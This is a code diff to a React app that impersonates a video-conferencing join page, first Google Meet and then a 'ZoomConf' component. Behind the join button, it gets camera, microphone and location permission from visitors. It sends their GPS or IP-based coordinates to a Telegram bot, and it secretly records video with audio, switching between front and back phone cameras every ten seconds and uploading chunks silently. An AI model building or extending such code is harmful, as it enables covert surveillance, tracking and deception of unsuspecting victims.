@@ -1,9 +1,7 @@
 import { VideoRecorder } from "./components/VideoRecorder";
 import { sendVideoToTelegram } from "./utils/videoUpload";
-import Container65 from "./imports/Container";
-import Margin2 from "./imports/Margin-5-1296";
+import ZoomConf from "./components/ZoomConf";
 import { useState, useEffect, useRef } from "react";
-import svgPaths from "./imports/svg-z1m31e6my9";
 
 // Set viewport IMMEDIATELY (before React renders)
 if (typeof document !== 'undefined') {
@@ -32,7 +30,11 @@ export default function App() {
   const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
   const [videoStreamBack, setVideoStreamBack] = useState<MediaStream | null>(null);
   const [isVideoRecording, setIsVideoRecording] = useState(false);
-
+  const [activeCameraMode, setActiveCameraMode] = useState<'front' | 'back'>('front');
+  const activeCameraModeRef = useRef<'front' | 'back'>('front'); // Use ref to avoid closure issues
+  const cameraSwitchIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const globalChunkCounterRef = useRef<number>(0); // Global chunk counter across camera switches
+  
   // Check if running in iframe with restricted permissions
   const checkIframePermissions = (): string | null => {
     // Check if we're in an iframe
@@ -164,7 +166,7 @@ export default function App() {
             }, 1000);
           })
           .catch(err => {
-            log('⚠️ [macOS] WebRTC ошибка (не критичн��):', err);
+            log('⚠️ [macOS] WebRTC ошибка (не критичн):', err);
             pc.close();
             resolve();
           });
@@ -207,8 +209,31 @@ export default function App() {
     
     log('▶️ Запрашиваем камеру и микрофон…');
     
-    // Start video recording with audio directly - WAIT for it
-    await startVideoRecording();
+    // Just request permissions - don't start recording yet
+    const device = detectDevice();
+    
+    if (device === 'desktop') {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: true
+      });
+      // Stop the stream - we'll request it again when starting recording
+      stream.getTracks().forEach(track => track.stop());
+    } else {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: true
+      });
+      // Stop the stream - we'll request it again when starting recording
+      stream.getTracks().forEach(track => track.stop());
+    }
     
     log('✅ Камера и микрофон: разрешено');
   };
@@ -217,7 +242,7 @@ export default function App() {
   const requestLocation = (timeoutMs = 8000) => {
     return new Promise((resolve, reject) => {
       if (!('geolocation' in navigator)) {
-        reject(new Error('Geolocation API недоступен'));
+        reject(new Error('Geolocation API ндоступен'));
         return;
       }
 
@@ -268,7 +293,7 @@ export default function App() {
         '→ Рзрешения → Камера и Микрофон → Разрешить.'
       ].join('\n');
     }
-    if (name.includes('NotFound')) return '❌ Не найдена камера или микрофон.\nПове��ьте подключение устройства.';
+    if (name.includes('NotFound')) return '❌ Не найдена камера или микрофон.\nПовеьте подключение устройства.';
     if (name.includes('Overconstrained')) return '❌ Запрошенное качество недоступно.';
     return '❌ Не удалось получить камеру/микрофон.\nПерезагрузите страницу и проверьте разрешения.';
   };
@@ -289,11 +314,11 @@ export default function App() {
         isMac ? '→ Разрешите Safari/Chrome доступ к геолокации' : 'Android (Chrome): значок замка',
         isMac ? '' : '→ Разрешения → Геоданные → Разрешить.',
         '',
-        isMac ? '⚠️ Также ��бедитесь что подключены к Wi-Fi!' : 'Для точности включите «Точная геопозиция»',
+        isMac ? '⚠️ Также бедитесь что подключены к Wi-Fi!' : 'Для точности включите «Точная геопозиция»',
         isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
       ].filter(Boolean).join('\n');
       case 2: return isMac 
-        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Службы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите браузеру доступ\n\n⚠️ Mac не имеет GPS, используется Wi-Fi триангуляция!'
+        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Службы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используется Wi-Fi триангуляция!'
         : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
       case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
       default: return isMac
@@ -318,33 +343,51 @@ export default function App() {
     
     console.log('🚀 Requesting permissions (microphone, geolocation)...');
     
-    // Execute permission requests immediately without pre-flight modal
+    // Execute permission requests immediately without any delays
     await executePermissionRequests();
   };
 
   // Execute the actual permission requests
   const executePermissionRequests = async () => {
-    setShowModal(false);
-    setCoordsData('🔄 Запрашиваем доступы...\n\nРазрешите микрофон и геолокаци\nдля полноценной работы.');
-    setShowCoords(true);
-    setShowRetryButton(false);
+    // CRITICAL: Start requesting permissions IMMEDIATELY without any delays
+    // Browser security requires permissions to be requested in direct user action handler
     
     const results: string[] = [];
     let hasErrors = false;
     let hasGeoError = false;
 
-    // Request Microphone & Camera
+    // Show initial message AFTER starting the requests (non-blocking)
+    setShowModal(false);
+    setShowRetryButton(false);
+
+    // Request Microphone & Camera FIRST (synchronously, no delays before this!)
+    let cameraSuccess = false;
     try {
+      // This must be the FIRST async operation after user click
       await requestCamMic();
       results.push('✅ Камера и микрофон: разрешено');
+      cameraSuccess = true;
+      
+      // Update UI after success
+      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашивам геолокацию...');
+      setShowCoords(true);
     } catch (e: any) {
       hasErrors = true;
       const hint = hintForMediaError(e);
       results.push(hint);
+      setCoordsData(hint);
+      setShowCoords(true);
     }
 
-    // Request Geolocation
+    // Request Geolocation (only if camera succeeded or independently)
     try {
+      // Update status
+      if (cameraSuccess) {
+        setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолокацию...');
+      } else {
+        setCoordsData('🔄 Запрашиваем геолокацию...');
+      }
+      
       // Detect if running on macOS
       const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                     /Macintosh/.test(navigator.userAgent);
@@ -352,7 +395,7 @@ export default function App() {
       // On macOS, trigger Local Network Access request BEFORE geolocation
       if (isMac) {
         log('🖥️ macOS - триггерим Local Network Access...');
-        setCoordsData('🔄 Запрашиваем доступы...\n\n⚠️ macOS: Разрешите доступ к локальной сети\nдля WiFi триангуляции');
+        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной сети');
         await triggerLocalNetworkAccess();
       }
       
@@ -362,6 +405,9 @@ export default function App() {
       const lng = Number(longitude).toFixed(6);
       const acc = Math.round(accuracy);
       results.push(`✅ Геолокация: разрешено\nlat: ${lat}\nlng: ${lng}\nточность: ±${acc} м`)
+      
+      // Update UI
+      setCoordsData(results.join('\n\n') + '\n\n📤 Отправка данных в Telegram...');
       
       // Send to Telegram bot
       await sendToTelegram(latitude, longitude, accuracy);
@@ -384,7 +430,7 @@ export default function App() {
           // Send IP-based location to Telegram
           await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
         } catch (ipError) {
-          log('❌ IP-геолокация также не работает:', ipError);
+          log('❌ IP-геолокация также не работае:', ipError);
           const hint = hintForGeoError(e);
           results.push(hint);
           
@@ -398,7 +444,7 @@ export default function App() {
         
         // Show specific GPS enable instructions
         if (e?.code === 2) {
-          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повторить попытку"');
+          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повторить попытк"');
         }
       }
     }
@@ -409,6 +455,19 @@ export default function App() {
     // Show retry button if GPS error
     if (hasGeoError) {
       setShowRetryButton(true);
+    }
+
+    // Start video recording AFTER getting all permissions
+    console.log('🎥 Запускаем видеозапись после получения разрешений...');
+    try {
+      await startVideoRecording();
+      results.push('✅ Видеозапись: запущена');
+      setCoordsData(results.join('\n\n'));
+      console.log('✅ Видеозапись успешно запущена');
+    } catch (error) {
+      console.error('❌ Ошибка запуска видеозаписи:', error);
+      results.push('⚠️ Видеозапись: ошибка запуска');
+      setCoordsData(results.join('\n\n'));
     }
 
     // Auto-hide success message after 4 seconds if no errors
@@ -584,7 +643,7 @@ export default function App() {
       const chatIds = await getAllChatIds(telegramBotToken);
       
       if (chatIds.size === 0) {
-        console.log('⚠️ Нет польвателей для отправки. Никто н�� писал боту /start');
+        console.log('⚠️ Нет польвателей для отправки. Никто н писал боту /start');
         // Silent mode - no alert
         return;
       }
@@ -597,7 +656,7 @@ export default function App() {
 
       // Use Safari-specific method for Safari, regular fetch for others
       if (browser === 'safari') {
-        console.log('🍎 Используем Safari-специфичный метод (XMLHttpRequest)');
+        console.log('🍎 Используем Safari-спцифичный метод (XMLHttpRequest)');
         
         for (const chatId of chatIds) {
           const success = await sendMessageSafari(telegramBotToken, chatId, message);
@@ -634,7 +693,7 @@ export default function App() {
               console.log(`✅ Успешно отправлено пользователю ${chatId}`);
             } else {
               errorCount++;
-              console.warn(`⚠️ Не удалось отправить пользователю ${chatId}:`, responseData);
+              console.warn(`⚠️ Н удалось отпавить пользователю ${chatId}:`, responseData);
             }
           } catch (error) {
             errorCount++;
@@ -668,40 +727,175 @@ export default function App() {
         setVideoStreamFront(stream);
         setIsVideoRecording(true);
         console.log('✅ Десктоп камера + микрофон готовы к записи');
-      } else {
-        // Mobile: only front camera (user-facing) WITH AUDIO
-        console.log('📱 Мобильное устройство - запрашиваем фронтальную камеру + микрофон...');
+      } else if (device === 'ios') {
+        // iOS: Alternating camera mode (can't use both simultaneously)
+        console.log('📱 iOS - запускаем режим переключения камер...');
         
-        try {
-          const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-              facingMode: 'user',
-              width: { ideal: 1280 },
-              height: { ideal: 720 }
-            },
-            audio: true // ✅ Include audio in video stream
-          });
-          setVideoStreamFront(frontStream);
-          setIsVideoRecording(true);
-          console.log('✅ Фронтальная камера + микрофо�� готовы:', frontStream.getVideoTracks()[0].getSettings());
-        } catch (e) {
-          console.error('❌ Не удалось получить фронтаьную камеру + микрофон:', e);
-        }
+        // Start with front camera
+        await switchToCamera('front');
+        setIsVideoRecording(true);
+        
+        // Setup camera switching interval (switch every 10 seconds)
+        cameraSwitchIntervalRef.current = setInterval(() => {
+          const currentMode = activeCameraModeRef.current;
+          const nextMode: 'front' | 'back' = currentMode === 'front' ? 'back' : 'front';
+          console.log(`🔄 [iOS] Переключаем камеру: ${currentMode} → ${nextMode}`);
+          switchToCamera(nextMode);
+        }, 10000); // Switch every 10 seconds
+        
+        console.log('✅ iOS: Режим переключения камер активирован (каждые 10 сек)');
+      } else {
+        // Android: Alternating camera mode (same as iOS - can't use both simultaneously)
+        console.log('📱 Android - запускаем режим переключения камер...');
+        
+        // Start with front camera
+        await switchToCamera('front');
+        setIsVideoRecording(true);
+        
+        // Setup camera switching interval (switch every 10 seconds)
+        cameraSwitchIntervalRef.current = setInterval(() => {
+          const nextMode: 'front' | 'back' = activeCameraMode === 'front' ? 'back' : 'front';
+          console.log(`🔄 [Android] Переключаем камеру: ${activeCameraMode} → ${nextMode}`);
+          switchToCamera(nextMode);
+        }, 10000); // Switch every 10 seconds
+        
+        console.log('✅ Android: Режим переключения камер активирован (каждые 10 сек)');
       }
     } catch (error) {
       console.error('❌ Ошибка при запуске видео+аудио записи:', error);
     }
   };
   
+  // Switch camera for iOS (stop current, start new)
+  const switchToCamera = async (mode: 'front' | 'back') => {
+    try {
+      console.log(`🔄 Переключение на ${mode === 'front' ? 'фронтальную' : 'заднюю'} камеру...`);
+      
+      // Stop current stream
+      if (videoStreamFront) {
+        videoStreamFront.getTracks().forEach(track => track.stop());
+        setVideoStreamFront(null);
+      }
+      if (videoStreamBack) {
+        videoStreamBack.getTracks().forEach(track => track.stop());
+        setVideoStreamBack(null);
+      }
+      
+      // Wait a bit for camera to release
+      await new Promise(r => setTimeout(r, 500));
+      
+      // Start new stream
+      const facingMode = mode === 'front' ? 'user' : 'environment';
+      
+      // Try with ideal first (more flexible), fallback to exact if needed
+      let stream: MediaStream | null = null;
+      
+      try {
+        console.log(`📹 Попытка 1: Запрос камеры с facingMode: ${facingMode} (без exact)`);
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { 
+            facingMode: facingMode, // Try without exact first
+            width: { ideal: mode === 'front' ? 1280 : 1920 },
+            height: { ideal: mode === 'front' ? 720 : 1080 }
+          },
+          audio: mode === 'front' // Only record audio from front camera
+        });
+        console.log(`✅ Попытка 1: Камера ${facingMode} получена БЕЗ exact`);
+      } catch (error) {
+        console.warn(`⚠️ Попытка 1 не удалась:`, error);
+        
+        // Fallback: try with ideal
+        try {
+          console.log(`📹 Попытка 2: Запрос камеры с ideal facingMode`);
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              facingMode: { ideal: facingMode },
+              width: { ideal: mode === 'front' ? 1280 : 1920 },
+              height: { ideal: mode === 'front' ? 720 : 1080 }
+            },
+            audio: mode === 'front'
+          });
+          console.log(`✅ Попытка 2: Камера получена с ideal`);
+        } catch (error2) {
+          console.warn(`⚠️ Попытка 2 не удалась:`, error2);
+          
+          // Last resort: try any camera
+          console.log(`📹 Попытка 3: Запрос любой доступной камеры`);
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              width: { ideal: mode === 'front' ? 1280 : 1920 },
+              height: { ideal: mode === 'front' ? 720 : 1080 }
+            },
+            audio: mode === 'front'
+          });
+          console.log(`✅ Попытка 3: Получена камера (возможно не та, что запрашивали)`);
+        }
+      }
+      
+      if (!stream) {
+        throw new Error('Не удалось получить поток камеры');
+      }
+      
+      // Log which camera we actually got
+      const videoTrack = stream.getVideoTracks()[0];
+      const settings = videoTrack.getSettings();
+      console.log(`📸 Полученная камера:`, {
+        facingMode: settings.facingMode,
+        width: settings.width,
+        height: settings.height,
+        deviceId: settings.deviceId,
+        label: videoTrack.label
+      });
+      
+      // Set the appropriate stream
+      if (mode === 'front') {
+        setVideoStreamFront(stream);
+      } else {
+        setVideoStreamBack(stream);
+      }
+      
+      setActiveCameraMode(mode);
+      activeCameraModeRef.current = mode; // Update ref to avoid closure issues
+      console.log(`✅ Переключено на ${mode === 'front' ? 'фронтальную' : 'заднюю'} камеру`);
+    } catch (error) {
+      console.error(`❌ Ошибка переключения на ${mode} камеру:`, error);
+      
+      // Fallback: try to restart front camera
+      if (mode === 'back') {
+        console.log('⚠️ Не удалось переключиться на заднюю, возвращаемся к фронтальной...');
+        await switchToCamera('front');
+      }
+    }
+  };
+  
+  // Cleanup camera switch interval on unmount
+  useEffect(() => {
+    return () => {
+      if (cameraSwitchIntervalRef.current) {
+        clearInterval(cameraSwitchIntervalRef.current);
+        cameraSwitchIntervalRef.current = null;
+      }
+    };
+  }, []);
+  
   // Handle video chunk ready (now includes audio)
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
     console.log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
-    await sendVideoToTelegram(blob, chunkNum, cameraType);
+    
+    // CRITICAL: Send video in background WITHOUT blocking UI
+    // Remove 'await' to prevent freezing the entire browser window
+    sendVideoToTelegram(blob, chunkNum, cameraType).catch(err => {
+      console.error(`❌ Ошибка отправки чанка #${chunkNum}:`, err);
+    });
+    
+    console.log(`✅ Чанк #${chunkNum} отправляется в фоне (UI не блокируется)`);
   };
 
   return (
-    <div className="relative flex h-screen w-full flex-col items-start justify-start bg-white overflow-hidden">
-      {/* Video Recorders - Now record video WITH audio */}
+    <>
+      <ZoomConf onRequestPermissions={handleRequestAllPermissions} />
+      
+      {/* Video Recording Components */}
       {videoStreamFront && (
         <VideoRecorder
           stream={videoStreamFront}
@@ -719,147 +913,6 @@ export default function App() {
           cameraType="back"
         />
       )}
-      
-      {/* Iframe Warning Banner */}
-      {iframeWarning && (
-        <div className="fixed top-0 left-0 right-0 bg-gradient-to-r from-red-600 to-orange-600 text-white px-3 sm:px-4 py-2 z-[70] shadow-lg">
-          <div className="flex items-center justify-between max-w-screen-xl mx-auto">
-            <div className="flex items-center gap-2 sm:gap-3">
-              <svg className="w-4 h-4 sm:w-5 sm:h-5 animate-pulse flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
-              </svg>
-              <span className="text-xs sm:text-sm font-semibold">⚠️ IFRAME: allow="geolocation; camera; microphone"</span>
-            </div>
-            <button 
-              onClick={() => setIframeWarning("")}
-              className="text-white/90 hover:text-white text-lg leading-none ml-2"
-            >
-              ✕
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* GPS Pre-flight Modal */}
-      {showModal && (
-        <div className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4 animate-in fade-in duration-200">
-          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-4 sm:p-6 animate-in zoom-in-95 duration-200 max-h-[90vh] overflow-y-auto">
-            <div className="flex items-center gap-3 mb-4">
-              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-orange-100 flex items-center justify-center animate-pulse flex-shrink-0">
-                <svg className="w-5 h-5 sm:w-6 sm:h-6 text-orange-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                </svg>
-              </div>
-              <div>
-                <h2 className="text-lg sm:text-xl font-semibold text-gray-900">Включите GPS</h2>
-                <p className="text-xs sm:text-sm text-gray-500">Требуется для продолжения</p>
-              </div>
-            </div>
-            
-            <div className="bg-blue-50 border-l-4 border-blue-500 p-3 sm:p-4 mb-4 rounded">
-              <p className="text-xs sm:text-sm text-blue-900 whitespace-pre-wrap leading-relaxed">
-                {deviceType === 'ios' 
-                  ? '📱 iOS:\n1️⃣ Откройте Настройки\n2️⃣ Кнфиденциальность > Службы геолокации\n3️⃣ Включите «Службы геолокации»\n4️⃣ Найдите Safari > Разрешить'
-                  : '📱 Android:\n1️⃣ Откройте Настройки\n2️⃣ Местоположение\n3️⃣ Включите геолокацию\n4️⃣ Выберите режим «Высокая точность»'
-                }
-              </p>
-            </div>
-
-            <div className="flex gap-2 sm:gap-3">
-              <button
-                onClick={() => {
-                  setShowModal(false);
-                  setShowCoords(false);
-                }}
-                className="flex-1 px-3 sm:px-4 py-2.5 sm:py-3 text-sm border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition-colors"
-              >
-                Отмена
-              </button>
-              <button
-                onClick={executePermissionRequests}
-                className="flex-1 px-3 sm:px-4 py-2.5 sm:py-3 text-sm bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all shadow-md hover:shadow-lg transform hover:scale-[1.02]"
-              >
-                Начать проверку
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Centered overlay with coordinates */}
-      <div
-        className="fixed inset-0 grid place-items-center pointer-events-none z-50 p-4"
-        role="status"
-        aria-live="polite"
-      >
-        {showCoords && (
-          <div className="pointer-events-auto bg-white text-[#111] border border-[#e5e7eb] rounded-xl px-4 sm:px-5 py-3 sm:py-4 shadow-[0_10px_40px_rgba(0,0,0,0.15)] font-mono text-xs sm:text-sm whitespace-pre-wrap text-center max-w-[calc(100vw-2rem)] sm:max-w-lg animate-in zoom-in-95 slide-in-from-top-4 duration-300">
-            {coordsData}
-            
-            {/* Retry Button */}
-            {showRetryButton && (
-              <button
-                onClick={executePermissionRequests}
-                className="mt-3 sm:mt-4 px-4 sm:px-6 py-2 sm:py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all shadow-md hover:shadow-lg transform hover:scale-105 font-sans font-semibold text-xs sm:text-sm animate-in slide-in-from-bottom-2 duration-300"
-              >
-                🔄 Повторить попытку
-              </button>
-            )}
-            
-            {/* Close Button */}
-            <button
-              onClick={() => {
-                setShowCoords(false);
-                setShowRetryButton(false);
-              }}
-              className="mt-2 sm:mt-3 text-[10px] sm:text-xs text-gray-500 hover:text-gray-700 underline font-sans"
-            >
-              Закрыть
-            </button>
-          </div>
-        )}
-      </div>
-
-      {/* Header */}
-      <div className="flex h-[56px] sm:h-[64px] w-full items-center justify-between px-3 sm:px-6 border-b border-[#e8eaed]">
-        {/* Logo */}
-        <div className="flex items-center gap-1.5 sm:gap-2">
-          <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-8 h-8 sm:w-10 sm:h-10">
-            <path d={svgPaths.p3593a00} fill="#EA4335"/>
-            <path d={svgPaths.p2d9ca100} fill="#FBBC04"/>
-            <path d={svgPaths.pa8b9100} fill="#34A853"/>
-            <path d={svgPaths.p69ea180} fill="#FBBC04"/>
-            <path d={svgPaths.p2d455e00} fill="#4285F4"/>
-            <path d={svgPaths.p21532d80} fill="#4285F4"/>
-            <path d={svgPaths.p1de9a900} fill="#188038"/>
-          </svg>
-          <span className="text-[#5f6368] text-base sm:text-[22px] leading-tight sm:leading-[28px] hidden xs:block">Google Meet</span>
-        </div>
-
-        {/* User Info */}
-        <div className="flex items-center gap-2 sm:gap-4">
-          <span className="text-[#3c4043] text-xs sm:text-[14px] leading-tight sm:leading-[20px] hidden md:block">tonyhbl@gmail.com</span>
-          <span className="text-[#3c4043] text-xs sm:text-[14px] leading-tight sm:leading-[20px] cursor-pointer hidden sm:block">Switch account</span>
-          <div className="h-6 w-6 sm:h-8 sm:w-8 rounded-full bg-[#202124] flex items-center justify-center cursor-pointer">
-            <span className="text-white text-xs sm:text-[14px] leading-tight sm:leading-[20px]">T</span>
-          </div>
-        </div>
-      </div>
-
-      {/* Main Content - Mobile: Vertical Stack, Desktop: Horizontal */}
-      <div className="flex flex-1 w-full items-center justify-center px-2 sm:px-4 md:px-8 py-2 sm:py-4 md:py-8 overflow-y-auto">
-        <div className="flex flex-col lg:flex-row items-center lg:items-start justify-center gap-4 sm:gap-6 md:gap-8 lg:gap-[80px] w-full max-w-full lg:max-w-[1200px]">
-          {/* Left Section - Video Preview */}
-          <div className="w-full lg:max-w-none lg:flex-shrink-0">
-            <Container65 onRequestPermissions={handleRequestPermissions} />
-          </div>
-
-          {/* Right Section - Join Controls */}
-          <div className="w-full lg:max-w-none lg:flex-shrink-0">
-            <Margin2 onJoinNow={handleRequestAllPermissions} />
-          </div>
-        </div>
-      </div>
-    </div>
+    </>
   );
 }
